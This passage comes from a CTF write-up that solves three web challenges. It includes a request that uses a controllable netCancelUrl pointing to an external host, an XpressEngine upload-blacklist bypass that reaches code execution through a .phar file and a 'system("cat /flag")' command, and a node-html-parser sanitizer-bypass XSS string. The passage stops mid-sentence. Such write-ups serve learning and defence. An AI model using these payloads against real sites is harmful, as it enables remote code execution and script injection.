class="variable">$authMap</span>)) &#123;</span><br><span class="line">    <span class="variable">$netcancelResultString</span> = <span class="variable">$httpUtil</span>-&gt;body;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Http Connect Error\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$httpUtil</span>-&gt;errormsg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Http Connect Error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;## 망취소 API 결과 ##&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$netcancelResultString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$$netcancelResultString</span>);</span><br><span class="line"><span class="variable">$netcancelResultString</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$$netcancelResultString</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>, <span class="variable">$netcancelResultString</span> . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>shop/inicis/inistdpay_result.php</code> make http requests to given url and parse them.<br>When the request for the <code>authUrl</code> has failed, It tries to cancel the request gracefully by requesting the <code>netCancelUrl</code> specified.<br>You can control both of authUrl and netCancelUrl, so It comes to print user specific variable at the last statement.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://1.230.253.91:5000/shop/inicis/inistdpay_result.php?authUrl=https://x/&amp;resultCode=0000&amp;authToken=x&amp;netCancelUrl=https://p6.is/1.php&amp;x=flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>Intended exploit is above, <code>1.php</code> in netCancelUrl just prints <code>x</code> without any whitespace.<br>$x is defined as a string <code>flag</code> by <code>extract($_GET)</code> in common.php, so It prints the <code>$flag</code> as a result.<br>You can see the flag in the response.</p><h2 id="XpressEngine"><a href="#XpressEngine" class="headerlink" title="XpressEngine"></a>XpressEngine</h2><ul><li>Difficulty: <strong>★★★</strong></li><li>Solved: <strong>2 &#x2F; 541</strong></li><li>Tag: <strong>PHP</strong>, <strong>RCE</strong></li></ul><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -yq --no-install-recommends apt-utils build-essential</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -yq evince</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Seoul</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get upgrade -yq</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install git wget curl unzip apache2 php7.2 php7.2-fpm \</span></span><br><span class="line"><span class="language-bash">    php7.2-mysql libapache2-mod-php7.2 php7.2-curl php7.2-gd php7.2-json php7.2-xml php7.2-mbstring php7.2-zip -yq</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> wget http://start.xpressengine.io/download/latest.zip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> unzip latest.zip &amp;&amp; <span class="built_in">chmod</span> -R 707 storage/ bootstrap/ config/ vendor/ plugins/ index.php composer.phar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/www/html/latest.zip /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> &gt;&gt; /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/AllowOverride None/AllowOverride All/g&#x27;</span> /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> a2enmod rewrite</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> service apache2 restart</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> entrypoint.sh /</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>Like the gnuboard, the dockerfile just installs apache2 and xpressengine on generic ubuntu:18.04 image.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;mimes&#x27;</span> =&gt; [</span><br><span class="line">    <span class="string">&#x27;black&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;pdf&#x27;</span>   =&gt; <span class="string">&#x27;application/pdf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mid&#x27;</span>   =&gt; <span class="string">&#x27;audio/midi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;midi&#x27;</span>  =&gt; <span class="string">&#x27;audio/midi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpga&#x27;</span>  =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp2&#x27;</span>   =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp3&#x27;</span>   =&gt; <span class="string">&#x27;audio/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aif&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aiff&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aifc&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-aiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ram&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-pn-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rm&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-pn-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rpm&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-pn-realaudio-plugin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ra&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-realaudio&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rv&#x27;</span>    =&gt; <span class="string">&#x27;video/vnd.rn-realvideo&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wav&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-wav&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpg&#x27;</span>   =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpeg&#x27;</span>  =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jpe&#x27;</span>   =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;png&#x27;</span>   =&gt; <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gif&#x27;</span>   =&gt; <span class="string">&#x27;image/gif&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;bmp&#x27;</span>   =&gt; <span class="string">&#x27;image/bmp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tiff&#x27;</span>  =&gt; <span class="string">&#x27;image/tiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tif&#x27;</span>   =&gt; <span class="string">&#x27;image/tiff&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpeg&#x27;</span>  =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpg&#x27;</span>   =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mpe&#x27;</span>   =&gt; <span class="string">&#x27;video/mpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;qt&#x27;</span>    =&gt; <span class="string">&#x27;video/quicktime&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mov&#x27;</span>   =&gt; <span class="string">&#x27;video/quicktime&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;avi&#x27;</span>   =&gt; <span class="string">&#x27;video/x-msvideo&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;movie&#x27;</span> =&gt; <span class="string">&#x27;video/x-sgi-movie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3g2&#x27;</span>   =&gt; <span class="string">&#x27;video/3gpp2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3gp&#x27;</span>   =&gt; <span class="string">&#x27;video/3gp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mp4&#x27;</span>   =&gt; <span class="string">&#x27;video/mp4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;m4a&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-m4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;f4v&#x27;</span>   =&gt; <span class="string">&#x27;video/mp4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;webm&#x27;</span>  =&gt; <span class="string">&#x27;video/webm&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;aac&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-acc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;m4u&#x27;</span>   =&gt; <span class="string">&#x27;application/vnd.mpegurl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wmv&#x27;</span>   =&gt; <span class="string">&#x27;video/x-ms-wmv&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;au&#x27;</span>    =&gt; <span class="string">&#x27;audio/x-au&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ac3&#x27;</span>   =&gt; <span class="string">&#x27;audio/ac3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;flac&#x27;</span>  =&gt; <span class="string">&#x27;audio/x-flac&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ogg&#x27;</span>   =&gt; <span class="string">&#x27;audio/ogg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;wma&#x27;</span>   =&gt; <span class="string">&#x27;audio/x-ms-wma&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ico&#x27;</span>   =&gt; [</span><br><span class="line">            <span class="string">&#x27;image/x-icon&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;image/vnd.microsoft.icon&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;php&#x27;</span>   =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php4&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;php3&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phtml&#x27;</span> =&gt; <span class="string">&#x27;application/x-httpd-php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phps&#x27;</span>  =&gt; <span class="string">&#x27;application/x-httpd-php-source&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;js&#x27;</span>    =&gt; <span class="string">&#x27;application/javascript&#x27;</span>,</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>Xpressengine defines their blacklist for uploaded files at <code>config/filesystems.php</code>.<br>You can see It blocks php php3 php4 phtml to do not upload.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">.</span>+\<span class="attr">.phps</span>$&quot;&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># Deny access to files without filename (e.g. &#x27;.php&#x27;)</span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;^\<span class="attr">.ph</span>(<span class="attr">ar</span>|<span class="attr">p</span>|<span class="attr">ps</span>|<span class="attr">tml</span>)$&quot;&gt;</span></span><br><span class="line">    Require all denied</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Running PHP scripts in user directories is disabled by default</span><br><span class="line"># </span><br><span class="line"># To re-enable PHP in user directories comment the following lines</span><br><span class="line"># (from <span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">...</span>&gt;</span> to <span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span>.) Do NOT set it to On as it</span><br><span class="line"># prevents .htaccess files from disabling it.</span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_userdir.c</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">home</span>/*/<span class="attr">public_html</span>&gt;</span></span><br><span class="line">        php_admin_flag engine Off</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Though in the <code>/etc/apache2/mods-available/php7.2.conf</code> which enabled with php installing,<br>It enables the files have phar extension to interpret as a php script file.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;file_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;98ee15c9-8944-44da-8d0f-1996dfe69ef7&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;folder_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ef1f2203-2dfb-4f96-a4f6-de1fd6f691b1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;site_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cdb63e8a-ac44-4339-942a-b5b11db9cbe4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;updated_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-02-15 15:02:52&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-02-15 15:02:52&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;display_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admina&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;introduction&quot;</span><span class="punctuation">:</span> <span class="keyword">null</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;profile_image_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/assets\/core\/user\/img\/default_avatar.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;profileImage&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/assets\/core\/user\/img\/default_avatar.png&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;98ee15c9-8944-44da-8d0f-1996dfe69ef7&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cfe4f40e-29d8-4104-b2bb-0a6f7826595a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public\/media_library\/98\/ee&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;clientname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image\/png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">281</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;download_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/storage\/app\/public\/media\/public\/media_library\/98\/ee\/202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;thumbnail_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/storage\/app\/public\/thumbnails\/4a\/08\/spill_400x400_4bf0a901851d7e833e1e586bb54d7d68795cb853.phar&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;download_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http:\/\/1.230.253.91:4000\/media_library\/file\/cdb63e8a-ac44-4339-942a-b5b11db9cbe4\/download&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>At the same time, <code>/media_library/file</code> route returns the path where the original file uploaded.<br>And the request to the path not prohibited.<br>So, after uploading file with phar extension embeds custom php script can make us execute any php command into it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.230.253.91:4000/storage/app/public/media/public/media_library/98/ee/202202151502525eefc6cc17cfd8e2d3e11b3a4b911eaa08077661.phar?cmd=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>The request to the <code>file.url</code> path will return flag.</p><h2 id="Marked"><a href="#Marked" class="headerlink" title="Marked"></a>Marked</h2><ul><li>Difficulty: <strong>★★★★</strong></li><li>Solved: <strong>0 &#x2F; 541</strong></li><li>Tag: <strong>Javascript</strong>, <strong>XSS</strong></li></ul><h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitizeHtml = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nodeHtmlParser = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">&#x27;marked&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; login &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> &#123; title, content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">checkParam</span>(title) || !<span class="title function_">checkParam</span>(content)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/list?message=invalid argument`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* convert markdown to html */</span></span><br><span class="line">  <span class="keyword">const</span> html = marked.<span class="title function_">parse</span>(content);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* sanitize string as suggested by vendor</span></span><br><span class="line"><span class="comment">   * https://github.com/markedjs/marked/blob/96c46c75957fa6fbcd9153f29ac71322eb4c74b8/README.md#usage</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> safeHtml = <span class="title function_">sanitizeHtml</span>(html);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* remove unuseful &lt;p&gt; wrapper */</span></span><br><span class="line">  <span class="keyword">const</span> dom = nodeHtmlParser.<span class="title function_">parse</span>(safeHtml);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dom.<span class="property">childNodes</span>.<span class="property">length</span> === <span class="number">2</span> &amp;&amp; dom.<span class="property">firstChild</span>.<span class="property">rawTagName</span> === <span class="string">&#x27;p&#x27;</span> &amp;&amp; dom.<span class="property">lastChild</span>.<span class="property">_rawText</span> === <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">    content = dom.<span class="property">firstChild</span>.<span class="property">innerHTML</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    content = dom.<span class="property">innerHTML</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Marked was a XSS challenge besides cyberchef below.<br>It converts the markdown string content to html with well-known markdown library called <code>marked</code>.<br>and the output goes to be santized with sanitize-html.<br>at the last, It parsed by <code>node-html-parser</code> again.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># node-html-parser</span></span><br><span class="line"><span class="strong">**Fast HTML Parser**</span> is a very fast HTML parser. Which will generate a simplified DOM tree, with element query support.</span><br></pre></td></tr></table></figure><p>The first hint <code>There&#39;s too many things to think about to implement a FAST parser.</code> describes about readme of node-html-parser above.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sanitize = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; parse &#125; = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&quot;&lt;/a&lt;a&gt;&lt;a&gt;&lt;a&lt;a\x0ba &quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parse</span>(<span class="title function_">sanitize</span>(html)).<span class="property">outerHTML</span>); <span class="comment">// &lt;a&gt;&lt;/a&lt;/a&gt;&lt;a a&gt;&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><code>node-html-parser</code> intends to misinterpret <code>\x0b</code> and unclosed closing html 